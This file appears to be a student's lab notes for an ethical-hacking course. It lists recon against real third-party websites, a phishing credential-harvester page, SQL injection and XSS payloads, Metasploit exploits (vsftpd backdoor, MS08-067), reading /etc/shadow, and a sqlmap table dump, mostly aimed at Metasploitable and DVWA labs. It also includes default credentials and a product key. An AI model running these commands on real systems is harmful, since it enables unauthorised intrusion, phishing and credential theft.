@@ -1,0 +1,161 @@
+msfadmin
+msfadmin
+admin
+password
+
+Practical-2
+
+use nmap and wafw00f or wpscan in kali
+
+then on browser use
+
+whois
+shodan
+mxtoolbox
+dnsdumpster
+haveibeenpwaned
+cache:tesla.com
+relate:tesla.com
+
+------------------------------------------------------------------------------------------------
+
+Practical-3
+
+Follow journal and chat gpt or you can also do it on your own.
+--traceroute
+
+use more options if you want.
+
+------------------------------------------------------------------------------------------------
+
+Practical-4
+
+First do tcp scan and show open ports.
+
+
+cd /usr/share/nmap/scripts
+
+sudo nmap -script ssh-auth-methods 192.168.64.130
+
+http-date
+
+ZAP:
+
+sudo apt-get update
+
+sudo apt install zaproxy
+
+open zap,then open go to quick start and click on automated scan put url and start and click on alerts
+
+
+
+---------------------------------------------------------------------------------------------------
+
+Practical-5
+
+Credential harvester working: VIDEO PHONE
+
+<html>
+<body>
+<a href = "http://192.168.64.133">Login to see your price</a>
+</body>
+</html>
+
+IMPORTANT COMMANDS
+
+sudo su
+chmod +777 /root
+
+
+QR code generator make sure you note the path
+
+just perform these 2
+
+------------------------------------------------------------------------------------------------------ 
+
+Practical-6
+
+PART-1 recon
+
+sudo wafw00f www.ruparel.edu or http://testfire.net/login.jsp
+
+sudo lbd www.---
+
+wpscan --url www.durhamcricket.co.uk | just search wordpress website
+Part of top command  --enumerate u
+
+PART-2 Exploit
+
+just go to metaspolitable2 and open firefox and type ipaddress of metasploitable 2 and dvwa
+
+admin
+password
+
+DVWA SECURITY= LOW
+
+SQL Injection(learn)
+
+1* or '='  
+1
+%' or '1'='1
+
+XSS Stored
+
+<script> alert("HELLO")</script>
+   
+--------------------------------------------------------------------------------------------------------
+
+Practical-7
+
+Don't need postgre sql
+
+First Part
+
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+search unix/ftp
+use
+show options
+exploit
+
+
+cd usr
+pwd
+ls -l
+cat /etc/shadow
+
+Second Part
+
+XP is 32-bit
+
+DPDQK-H94J9-TWMTR-K2K69-FRKHM
+
+use exploit/windows/smb/ms08_067_netapi 
+
+set rhosts
+set lport
+
+sysinfo
+screenshare
+pwd
+screenshare
+shell
+exit
+dir
+ps
+kill 1500
+shutdown
+
+Follow Journal-- see bridging but program works without bridging too
+
+also use search
+
+--------------------------------------------------------------------------------------------------------
+
+Practical-8
+
+sqlmap -u "http://192.168.64.130/dvwa/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID:c37e8016c110e30783c24f6d273cefa6;security=low" -D dvwa -T users --dump
+
+
+
